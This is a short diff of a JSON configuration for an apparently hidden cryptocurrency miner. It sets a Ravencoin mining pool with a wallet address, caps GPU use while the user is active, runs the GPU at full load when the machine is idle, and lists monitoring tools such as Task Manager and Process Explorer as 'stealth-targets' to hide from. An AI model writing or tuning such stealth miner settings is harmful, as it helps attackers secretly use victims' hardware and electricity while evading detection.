@@ -1,7 +1,7 @@
 {
-    "url": "stratums://`RLQNjsSpF13yKMr4Qtto3A2EULVTfJBQ9i`.Dogs@rvn.hiveon.com:7777",
+    "url": "stratums://`RLQNjsSpF13yKMr4Qtto3A2EULVTfJBQ9i`.Ametrine:x@rvn.hiveon.com:7777",
     "algo": "kawpow",
-    "max-gpu": 30,
+    "max-gpu": 20,
     "idle-wait": 1,
     "idle-gpu": 100,
     "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
